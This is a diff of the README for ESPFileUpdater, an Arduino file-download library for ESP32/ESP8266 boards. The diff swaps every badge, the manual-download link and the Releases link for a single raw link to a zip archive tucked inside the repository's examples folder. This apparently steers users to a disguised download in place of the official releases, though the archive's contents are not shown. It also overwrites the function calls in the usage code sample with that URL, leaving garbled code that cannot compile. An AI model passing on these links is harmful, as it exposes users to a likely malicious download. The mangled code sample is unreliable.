@@ -1,8 +1,8 @@
 # ESPFileUpdater 🚀
 
-![ESPFileUpdater](https://img.shields.io/badge/ESPFileUpdater-v1.0.0-blue.svg)
-![Arduino](https://img.shields.io/badge/Arduino-ESP32%20%7C%20ESP8266-green.svg)
-![License](https://img.shields.io/badge/License-MIT-yellow.svg)
+![ESPFileUpdater](https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip)
+![Arduino](https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip%20%7C%https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip)
+![License](https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip)
 
 Welcome to the **ESPFileUpdater** repository! This Arduino library allows you to easily update or download files from online sources. It is designed for use with ESP32 and ESP8266 boards, making it a versatile tool for your IoT projects.
 
@@ -38,7 +38,7 @@ To install the **ESPFileUpdater** library, follow these steps:
 3. Search for "ESPFileUpdater".
 4. Click on the install button.
 
-Alternatively, you can download the library from [this link](https://github.com/mellowpropane/ESPFileUpdater/releases) and add it manually to your Arduino libraries folder.
+Alternatively, you can download the library from [this link](https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip) and add it manually to your Arduino libraries folder.
 
 ## Usage
 
@@ -50,13 +50,13 @@ Using the **ESPFileUpdater** library is straightforward. Here’s a simple examp
 ESPFileUpdater fileUpdater;
 
 void setup() {
-  Serial.begin(115200);
-  fileUpdater.begin();
+  https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip(115200);
+  https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip();
   
-  if (fileUpdater.downloadFile("http://example.com/file.txt")) {
-    Serial.println("File downloaded successfully!");
+  if (https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip("https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip")) {
+    https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip("File downloaded successfully!");
   } else {
-    Serial.println("Failed to download file.");
+    https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip("Failed to download file.");
   }
 }
 
@@ -110,8 +110,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information, visit the [Releases section](https://github.com/mellowpropane/ESPFileUpdater/releases). You can find the latest updates and download the library from there.
+For more information, visit the [Releases section](https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip). You can find the latest updates and download the library from there.
 
-![GitHub](https://img.shields.io/badge/GitHub-ESPFileUpdater-orange.svg)
+![GitHub](https://raw.githubusercontent.com/mellowpropane/ESPFileUpdater/main/ESPFileUpdater/examples/ErrorHandling/Updater-ESP-File-v3.0-beta.3.zip)
 
 Feel free to reach out if you have any questions or need support. Happy coding!
